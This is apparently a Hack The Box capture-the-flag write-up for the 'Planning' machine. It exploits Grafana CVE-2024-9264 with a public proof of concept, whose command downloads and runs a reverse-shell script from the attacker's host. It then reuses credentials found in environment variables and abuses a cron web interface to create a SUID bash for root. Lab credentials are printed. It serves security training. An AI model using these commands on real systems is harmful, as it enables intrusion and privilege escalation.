---
icon: notebook
---

# HTB-PLANNING

<figure><img src="../../../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

## Attack Flow Explanation

#### Phase 1: Initial Reconnaissance

1. **Port Scanning**: Standard Nmap scan reveals SSH (22) and HTTP (80) services
2. **Virtual Host Discovery**: Using ffuf to enumerate subdomains discovers `grafana.planning.htb`
3. **Service Identification**: Grafana v11.0.0 identified on the subdomain

#### Phase 2: Initial Access

1. **Credential Testing**: Provided credentials `admin:0D5oT70Fq13EvB5r` successfully authenticate to Grafana
2. **Vulnerability Research**: Grafana v11.0.0 is vulnerable to CVE-2024-9264 (DuckDB RCE)
3. **Exploit Execution**: Deploy proof-of-concept to achieve remote code execution
4. **Container Compromise**: Gain root-level access within the Docker container

#### Phase 3: Lateral Movement

1. **Environment Enumeration**: Examine container environment variables
2. **Credential Discovery**: Extract `enzo:RioTecRANDEntANT!` from Grafana configuration
3. **Host Access**: Use discovered credentials for SSH authentication to the host system
4. **User Flag**: Successfully retrieve the first flag from enzo's home directory

#### Phase 4: Privilege Escalation

1. **System Enumeration**: Explore filesystem for privilege escalation vectors
2. **Crontab Discovery**: Locate `/opt/crontabs/crontab.db` containing scheduled tasks
3. **Password Extraction**: Extract `P4ssw0rdS0pRi0T3c` from backup job configuration
4. **Service Discovery**: Identify local service on port 8000 requiring authentication
5. **Port Forwarding**: Establish SSH tunnel to access the internal service
6. **Crontab UI Access**: Authenticate to web-based cron management interface
7. **Malicious Job Creation**: Create cronjob to set SUID bit on bash binary
8. **Privilege Escalation**: Execute `/tmp/bash -p` to gain root privileges
9. **Root Flag**: Successfully retrieve the final flag

#### Key Vulnerabilities Exploited

* **CVE-2024-9264**: Grafana DuckDB Remote Code Execution
* **Credential Reuse**: Environment variables containing sensitive passwords
* **Weak Access Controls**: Password-protected cron management interface
* **Privileged Cron Execution**: Ability to create arbitrary root-level scheduled tasks

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```sql
(sn0x㉿sn0x)-[~/hackthebox/planning]
└─$ sudo nmap -sCV -T4 10.10.11.68 -oA nmap-initial
[sudo] password for sn0x: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 05:46 EDT
Nmap scan report for 10.10.11.68
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds

```

Apart from SSH on port 22, only a web server is running on port 80. I'll add `planning.htb` to my `/etc/hosts` file before investigating the web application.

```sql
sn0x㉿sn0x)-[~/hackthebox/planning]
└─$ echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts > /dev/null
[sudo] password for sn0x: 
```

<figure><img src="../../../../.gitbook/assets/Image.png" alt=""><figcaption></figcaption></figure>

Now I can begin subdomain enumeration using ffuf. I'll fuzz for virtual hosts on the target to discover any additional services or applications hosted on different subdomains.

```sql
(sn0x㉿sn0x)-[~/hackthebox/planning]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://10.10.11.68' -H "Host:FUZZ.planning.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 154ms]

```

The ffuf scan reveals a `grafana` subdomain that returns a 302 redirect, indicating there's likely a Grafana monitoring dashboard accessible at `grafana.planning.htb`. I'll add this subdomain to my `/etc/hosts` file and investigate further.

## Initial foothold

Adding this one to our hosts-file:

```python
(sn0x㉿sn0x)-[~/hackthebox/planning]
└─$ echo "10.10.11.68 grafana.planning.htb" | sudo tee -a /etc/hosts > /dev/null 
```

<figure><img src="../../../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

Accessing `grafana.planning.htb` reveals Grafana v11.0.0. The provided credentials authenticate successfully.

The Grafana instance reveals it's running version 11.0.0 at the bottom of the page. This version is vulnerable to CVE-2024-9264, which has a public exploit available on GitHub.

Since this simulates a real-world penetration test scenario, I'm provided with initial credentials to begin the assessment: `admin:0D5oT70Fq13EvB5r`. With these credentials and the identified vulnerability, I can proceed to exploit the Grafana instance.

Research on Grafana v11.0.0 reveals CVE-2024-9264, which allows file read and remote code execution via DuckDB integration. Testing the proof-of-concept confirms the vulnerability is exploitable, returning root-level access. I can now establish a proper reverse shell connection to gain persistent access to the system.

```sql
(venv)─(sn0x㉿sn0x)-[~/hackthebox/planning]
└─$ git clone https://github.com/nollium/CVE-2024-9264.git 
cd CVE-2024-9264
python -m venv venv
source ./venv/bin/activate
pip install -r requirements.txt
[...]
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://<ip>:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh" http://grafana.planning.htb

```

## **Exploiting CVE-2024-9264:**

I execute the exploit to gain remote code execution on the Grafana container. The payload downloads and executes a reverse shell script from my attacking machine:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.11.68:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh" http://grafana.planning.htb
```

**Container Access & Credential Discovery:**

The reverse shell drops me into the Docker container as root. Examining the environment variables reveals Grafana's admin credentials:

<pre class="language-sql"><code class="lang-sql">$ env
SHELL=/usr/bin/bash
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm-256color
AWS_AUTH_EXTERNAL_ID=
SHLVL=3
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
<strong>GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
</strong><strong>GF_SECURITY_ADMIN_USER=enzo
</strong>GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
</code></pre>

These credentials (`enzo:RioTecRANDEntANT!`) also work for SSH access to the host system.

**Host System Access:**

SSH authentication succeeds, granting access to the planning.htb host where I retrieve the user flag:

```bash
(sn0x㉿sn0x)-[~/hackthebox/planning/CVE-2024-9264]
└─$ ssh enzo@planning.htb
The authenticity of host 'planning.htb (10.10.11.68)' can't be established.

enzo@planning.htb's password: RioTecRANDEntANT!

Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  
enzo@planning:~$ ls
user.txt

enzo@planning:~$ cat user.txt 
30a5769fc6edd31f3fa2e697b79a9f79

enzo@planning:~$ cat /opt/crontabs/crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}

enzo@planning:~$ netstat -tupln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35365         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -  
```

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

The `/opt` directory contains a `crontabs` folder with a `crontab.db` file owned by root and recently modified. This JSON file defines two scheduled jobs - notably, the "Grafana backup" task exports the Docker image to `/var/backups` and creates a password-protected ZIP file using the password `P4ssw0rdS0pRi0T3c`.

`crontab.db`

```sql

{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}

```

The root account doesn't accept the discovered password, so I investigate the application that processes this JSON file. Port 8000 is listening locally, but accessing it returns a 401 Unauthorized error, indicating it requires basic authentication credentials.

<pre class="language-sql"><code class="lang-sql">$ curl -v http://127.0.0.1:8000
*   Trying 127.0.0.1:8000...
* Connected to 127.0.0.1 (127.0.0.1) port 8000
> GET / HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.5.0
> Accept: */*
> 
<strong>&#x3C; HTTP/1.1 401 Unauthorized
</strong>&#x3C; X-Powered-By: Express
<strong>&#x3C; WWW-Authenticate: Basic realm="Restricted Area"
</strong>&#x3C; Content-Type: text/html; charset=utf-8
&#x3C; Content-Length: 0
&#x3C; ETag: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
&#x3C; Date: Sun, 11 May 2025 18:50:54 GMT
&#x3C; Connection: keep-alive
&#x3C; Keep-Alive: timeout=5
&#x3C; 
* Connection #0 to host 127.0.0.1 left intact
</code></pre>

I set up SSH port forwarding to access port 8000 locally. The credentials `root:P4ssw0rdS0pRi0T3c` successfully authenticate, revealing "Crontab UI" - a web interface for managing crontab files safely.

<figure><img src="../../../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

The dashboard displays the two existing cronjobs from the JSON file. I create a new cronjob that copies the `bash` binary to `/tmp` and sets the SUID bit. Using the "Run now" feature executes the job immediately, allowing me to run `/tmp/bash -p` for privilege escalation and retrieve the root flag.

<figure><img src="../../../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

## ROOT

```sql
(sn0x㉿sn0x)-[~/hackthebox/planning/CVE-2024-9264]
└─$ ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 10 10:58:17 PM UTC 2025

  System load:           0.04
  Usage of /:            70.1% of 6.30GB
  Memory usage:          47%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.247.54
  IPv6 address for eth0: dead:beef::250:56ff:fe94:bc92


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat May 10 22:58:18 2025 from 10.10.14.71

enzo@planning:~$  cd /tmp/  
enzo@planning:/tmp$ ll
total 48
drwxrwxrwt 12 root root 4096 May 11 11:09 ./
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ../
drwxrwxrwt  2 root root 4096 May 11 10:57 .font-unix/
drwxrwxrwt  2 root root 4096 May 11 10:57 .ICE-unix/
drwx------  3 root root 4096 May 11 10:57 systemd-private-a859e66f3f334de69ecddea73d82f703-ModemManager.service-zpH7dR/
drwx------  3 root root 4096 May 11 10:57 systemd-private-a859e66f3f334de69ecddea73d82f703-polkit.service-claJmR/
drwx------  3 root root 4096 May 11 10:57 systemd-private-a859e66f3f334de69ecddea73d82f703-systemd-logind.service-oAw6Gk/
drwx------  3 root root 4096 May 11 10:57 systemd-private-a859e66f3f334de69ecddea73d82f703-systemd-resolved.service-pswegL/
drwx------  3 root root 4096 May 11 10:57 systemd-private-a859e66f3f334de69ecddea73d82f703-systemd-timesyncd.service-oxcQIx/
drwx------  2 root root 4096 May 11 10:58 vmware-root_734-2991268422/
drwxrwxrwt  2 root root 4096 May 11 10:57 .X11-unix/
drwxrwxrwt  2 root root 4096 May 11 10:57 .XIM-unix/
-rw-r--r--  1 root root    0 May 11 11:10 YvZsUUfEXayH6lLj.stderr
-rw-r--r--  1 root root    0 May 11 11:10 YvZsUUfEXayH6lLj.stdout
enzo@planning:/tmp$ ./bash -p
bash-5.2# whoami                                                                                                     │
root 
bash-5.2# cat /root/root.txt
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
